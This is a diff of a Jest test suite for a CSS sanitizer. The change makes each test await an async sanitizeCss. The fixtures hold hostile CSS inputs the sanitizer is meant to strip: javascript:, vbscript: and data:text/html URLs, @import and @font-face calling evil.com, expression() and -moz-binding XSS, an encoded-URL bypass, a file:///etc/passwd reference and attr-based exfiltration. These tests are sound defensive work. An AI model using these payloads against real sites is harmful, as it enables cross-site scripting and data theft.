@@ -3,7 +3,7 @@ import { sanitizeCss, validateNoUiBreaking } from '../css-sanitizer';
 
 describe('CSS Sanitizer', () => {
   describe('sanitizeCss', () => {
-    it('should allow safe CSS', () => {
+    it('should allow safe CSS', async () => {
       const css = `
         .card {
           background: linear-gradient(135deg, #d946ef, #3b82f6);
@@ -11,151 +11,151 @@ describe('CSS Sanitizer', () => {
           padding: 16px;
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toBeTruthy();
       expect(result).toContain('background');
       expect(result).toContain('border-radius');
     });
 
-    it('should block javascript: URLs', () => {
+    it('should block javascript: URLs', async () => {
       const css = `
         .card {
           background-image: url('javascript:alert(1)');
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toBeTruthy(); // CSS is valid, just URL removed
       expect(result).not.toContain('javascript:');
     });
 
-    it('should block data: URLs (non-image)', () => {
+    it('should block data: URLs (non-image)', async () => {
       const css = `
         .card {
           background-image: url('data:text/html,<script>alert(1)</script>');
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toBeTruthy();
       expect(result).not.toContain('data:text/html');
     });
 
-    it('should allow data:image/ URLs', () => {
+    it('should allow data:image/ URLs', async () => {
       const css = `
         .card {
           background-image: url('data:image/png;base64,iVBORw0KGgo=');
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toContain('data:image/png');
     });
 
-    it('should allow https:// URLs', () => {
+    it('should allow https:// URLs', async () => {
       const css = `
         .card {
           background-image: url('https://example.com/image.png');
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toContain('https://example.com/image.png');
     });
 
-    it('should block @import rules', () => {
+    it('should block @import rules', async () => {
       const css = `
         @import url('https://evil.com/steal.css');
         .card { color: red; }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).not.toContain('@import');
       expect(result).toContain('color');
     });
 
-    it('should block @font-face rules', () => {
+    it('should block @font-face rules', async () => {
       const css = `
         @font-face {
           font-family: 'Tracker';
           src: url('https://evil.com/track.woff');
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toBeTruthy();
       expect(result).not.toContain('@font-face');
       expect(result).not.toContain('evil.com');
     });
 
-    it('should block :visited pseudo-class', () => {
+    it('should block :visited pseudo-class', async () => {
       const css = `
         a:visited {
           background: url('https://track.com/?visited=1');
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toBeTruthy();
       expect(result).not.toContain(':visited');
     });
 
-    it('should block IE behavior property', () => {
+    it('should block IE behavior property', async () => {
       const css = `
         .card {
           behavior: url(xss.htc);
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toBeTruthy();
       expect(result).not.toContain('behavior');
     });
 
-    it('should block expression() values', () => {
+    it('should block expression() values', async () => {
       const css = `
         .card {
           width: expression(alert('XSS'));
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toBeTruthy();
       expect(result).not.toContain('expression');
     });
 
-    it('should handle URL encoding bypass attempts', () => {
+    it('should handle URL encoding bypass attempts', async () => {
       const css = `
         .card {
           background: url('%6A%61%76%61%73%63%72%69%70%74:alert(1)');
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       // Should decode and block
       expect(result).toBeTruthy();
       expect(result).not.toContain('%6A');
       expect(result).not.toContain('javascript');
     });
 
-    it('should apply scoping when requested', () => {
+    it('should apply scoping when requested', async () => {
       const css = `
         .header {
           background: red;
         }
       `;
-      const result = sanitizeCss(css, { scope: '[data-profile]' });
+      const result = await sanitizeCss(css, { scope: '[data-profile]' });
       expect(result).toContain('[data-profile]');
       expect(result).toContain('.header');
     });
 
-    it('should enforce selector limit', () => {
+    it('should enforce selector limit', async () => {
       const css = Array.from({ length: 600 }, (_, i) => `.class${i} { color: red; }`).join('\n');
-      const result = sanitizeCss(css, { maxSelectors: 500 });
+      const result = await sanitizeCss(css, { maxSelectors: 500 });
       expect(result).toBeNull();
     });
 
-    it('should enforce nesting depth limit', () => {
+    it('should enforce nesting depth limit', async () => {
       // Create deeply nested CSS
       let css = '.a { color: red; }';
       for (let i = 0; i < 15; i++) {
         css = `.level${i} { ${css} }`;
       }
-      const result = sanitizeCss(css, { maxNestingDepth: 5 });
+      const result = await sanitizeCss(css, { maxNestingDepth: 5 });
       expect(result).toBeNull();
     });
 
-    it('should allow custom properties (CSS variables)', () => {
+    it('should allow custom properties (CSS variables)', async () => {
       const css = `
         :root {
           --primary-color: #d946ef;
@@ -164,123 +164,123 @@ describe('CSS Sanitizer', () => {
           background: var(--primary-color);
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toContain('--primary-color');
       expect(result).toContain('var(--primary-color)');
     });
 
-    it('should block non-whitelisted properties', () => {
+    it('should block non-whitelisted properties', async () => {
       const css = `
         .card {
           -webkit-user-modify: read-write;
           -moz-binding: url(xss.xml#xss);
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toBeTruthy();
       expect(result).not.toContain('-webkit-user-modify');
       expect(result).not.toContain('-moz-binding');
     });
 
-    it('should allow @keyframes when allowAnimations is true', () => {
+    it('should allow @keyframes when allowAnimations is true', async () => {
       const css = `
         @keyframes slideIn {
           from { opacity: 0; }
           to { opacity: 1; }
         }
       `;
-      const result = sanitizeCss(css, { allowAnimations: true });
+      const result = await sanitizeCss(css, { allowAnimations: true });
       expect(result).toContain('@keyframes');
       expect(result).toContain('slideIn');
     });
 
-    it('should block @keyframes when allowAnimations is false', () => {
+    it('should block @keyframes when allowAnimations is false', async () => {
       const css = `
         @keyframes slideIn {
           from { opacity: 0; }
           to { opacity: 1; }
         }
       `;
-      const result = sanitizeCss(css, { allowAnimations: false });
+      const result = await sanitizeCss(css, { allowAnimations: false });
       expect(result).toBeTruthy();
       expect(result).not.toContain('@keyframes');
     });
 
-    it('should allow @media when allowMediaQueries is true', () => {
+    it('should allow @media when allowMediaQueries is true', async () => {
       const css = `
         @media (max-width: 768px) {
           .card { display: block; }
         }
       `;
-      const result = sanitizeCss(css, { allowMediaQueries: true });
+      const result = await sanitizeCss(css, { allowMediaQueries: true });
       expect(result).toContain('@media');
       expect(result).toContain('max-width');
     });
 
-    it('should block @media when allowMediaQueries is false', () => {
+    it('should block @media when allowMediaQueries is false', async () => {
       const css = `
         @media (max-width: 768px) {
           .card { display: block; }
         }
       `;
-      const result = sanitizeCss(css, { allowMediaQueries: false });
+      const result = await sanitizeCss(css, { allowMediaQueries: false });
       expect(result).toBeTruthy();
       expect(result).not.toContain('@media');
     });
 
-    it('should handle invalid CSS gracefully', () => {
+    it('should handle invalid CSS gracefully', async () => {
       const css = `
         .card { { { invalid css
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toBeNull();
     });
 
-    it('should block file: protocol URLs', () => {
+    it('should block file: protocol URLs', async () => {
       const css = `
         .card {
           background: url('file:///etc/passwd');
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toBeTruthy();
       expect(result).not.toContain('file:');
     });
 
-    it('should block vbscript: protocol URLs', () => {
+    it('should block vbscript: protocol URLs', async () => {
       const css = `
         .card {
           background: url('vbscript:msgbox("XSS")');
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toBeTruthy();
       expect(result).not.toContain('vbscript:');
     });
 
-    it('should block about: protocol URLs', () => {
+    it('should block about: protocol URLs', async () => {
       const css = `
         .card {
           background: url('about:blank');
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toBeTruthy();
       expect(result).not.toContain('about:');
     });
 
-    it('should block content property (data exfiltration risk)', () => {
+    it('should block content property (data exfiltration risk)', async () => {
       const css = `
         .card::before {
           content: attr(data-secret);
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toBeTruthy();
       expect(result).not.toContain('content');
     });
 
-    it('should allow safe layout properties', () => {
+    it('should allow safe layout properties', async () => {
       const css = `
         .card {
           display: flex;
@@ -290,7 +290,7 @@ describe('CSS Sanitizer', () => {
           gap: 16px;
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toContain('display');
       expect(result).toContain('flex-direction');
       expect(result).toContain('justify-content');
@@ -298,7 +298,7 @@ describe('CSS Sanitizer', () => {
       expect(result).toContain('gap');
     });
 
-    it('should allow safe visual effects', () => {
+    it('should allow safe visual effects', async () => {
       const css = `
         .card {
           opacity: 0.8;
@@ -307,39 +307,39 @@ describe('CSS Sanitizer', () => {
           transition: all 0.3s ease;
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toContain('opacity');
       expect(result).toContain('filter');
       expect(result).toContain('transform');
       expect(result).toContain('transition');
     });
 
-    it('should scope multiple selectors', () => {
+    it('should scope multiple selectors', async () => {
       const css = `
         .card, .item {
           color: red;
         }
       `;
-      const result = sanitizeCss(css, { scope: '[data-profile]' });
+      const result = await sanitizeCss(css, { scope: '[data-profile]' });
       expect(result).toContain('[data-profile]');
       // Both selectors should be scoped
       const scopeCount = (result?.match(/\[data-profile\]/g) || []).length;
       expect(scopeCount).toBeGreaterThanOrEqual(2);
     });
 
-    it('should handle empty CSS', () => {
+    it('should handle empty CSS', async () => {
       const css = '';
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toBe('');
     });
 
-    it('should handle whitespace-only CSS', () => {
+    it('should handle whitespace-only CSS', async () => {
       const css = '   \n\n  \t  ';
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toBeTruthy();
     });
 
-    it('should preserve valid CSS structure', () => {
+    it('should preserve valid CSS structure', async () => {
       const css = `
         .container {
           max-width: 1200px;
@@ -351,7 +351,7 @@ describe('CSS Sanitizer', () => {
           font-weight: bold;
         }
       `;
-      const result = sanitizeCss(css);
+      const result = await sanitizeCss(css);
       expect(result).toContain('max-width');
       expect(result).toContain('margin');
       expect(result).toContain('padding');
